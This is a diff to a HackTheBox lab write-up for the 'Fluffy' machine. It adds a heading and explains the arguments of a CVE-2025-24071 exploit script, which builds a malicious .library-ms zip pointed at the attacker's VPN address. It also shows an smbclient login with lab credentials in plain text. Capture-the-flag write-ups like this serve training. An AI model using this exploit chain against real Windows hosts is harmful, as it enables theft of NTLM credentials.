@@ -193,6 +193,8 @@ Lets use the above to check if we can list the shares
 smbclient //fluffy.htb/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!
 ```
 
+
+#### SMB listings
 Now we get the access and everything looks okayish except the Upgrade_notice.pdf and Malicious.library-ms
 ```bash
 smb: \> ls
@@ -229,5 +231,9 @@ cd CVE-2025-24071
 
 Now lets craft the exploit.zip file
 ```bash
-python3 exploit.py -f malicious -i 10.10.14.71
+python3 exploit.py -f malicious -i $tun0
 ```
+Explaination
+-f : name of the library without extension we can see that in [[#SMB listings|Here]]
+-i : our hackthebox vpn ip or tun0 ip 
+
